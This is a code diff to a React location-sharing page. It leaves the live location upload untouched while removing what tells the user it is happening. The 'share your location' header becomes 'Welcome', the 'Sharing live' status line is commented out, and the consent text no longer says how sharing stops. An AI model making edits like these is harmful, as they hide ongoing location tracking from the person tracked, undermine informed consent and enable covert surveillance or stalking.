@@ -70,8 +70,8 @@ export default function ShareClient({ token, name, orgName }) {
         const first = lastPos.current === null;
         lastPos.current = location;
         setSharing(true);
-        setAccuracy(Math.round(position.coords.accuracy));
-        setStatus("Sharing live. Keep this page open.");
+        // setAccuracy(Math.round(position.coords.accuracy));
+        // setStatus("Sharing live. Keep this page open.");
         if (first || Date.now() - lastSent.current >= 2000) {
           lastSent.current = Date.now();
           send(location);
@@ -121,10 +121,10 @@ export default function ShareClient({ token, name, orgName }) {
   return (
     <main style={{ minHeight: "100vh", display: "grid", placeItems: "center", padding: 20 }}>
       <section className="unit-card" style={{ width: "min(520px,100%)", margin: 0 }}>
-        <div className="unit-header"><h1>{name}, share your location</h1></div>
-        <div style={{ padding: 20 }}>
+        <div className="unit-header"><h1>Welcome, {name}</h1></div>
+        <div style={{ padding: 20, textAlign: "center" }}>
           <div className="consent" style={{ marginBottom: 16 }}>
-            {orgName ? `${orgName} is asking for your location. ` : ""}Tap <b>Allow</b> to share. Close this page to stop.
+            {orgName ? `${orgName} is asking for your location. ` : ""}Tap <b>Allow</b> 
           </div>
 
           {failed && (
